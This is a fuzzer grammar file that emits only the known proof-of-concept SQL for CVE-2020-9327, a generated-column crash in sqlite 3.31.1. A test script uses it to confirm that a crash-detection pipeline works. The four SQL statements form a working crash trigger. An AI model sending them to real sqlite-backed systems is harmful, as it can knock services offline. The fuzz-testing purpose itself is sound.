# cve_2020_9327_poc.py — Deterministic PoC grammar for CVE-2020-9327
# Target: sqlite-3.31.1 (segfault via uninitialized pointer in generated column)
# Expected: harness crashes with SIGTRAP (exit 133) or SIGNAL
#
# This grammar produces ONLY the exact CVE PoC SQL. No randomness.
# Used by deep_test.sh to verify the crash detection pipeline end-to-end.

ctx.rule("START", "{Line1};\n{Line2};\n{Line3};\n{Line4};")
ctx.rule("Line1", "CREATE TABLE v0(v3, v1 AS(v1) UNIQUE)")
ctx.rule("Line2", "CREATE TABLE v5(v6 UNIQUE, v7 UNIQUE)")
ctx.rule("Line3", "CREATE VIEW v8(v9) AS SELECT coalesce(v3, v1) FROM v0 WHERE v1 IN('MED BOX')")
ctx.rule("Line4", "SELECT *FROM v8 JOIN v5 WHERE 0 > v7 AND v9 OR v6 = 's%'")
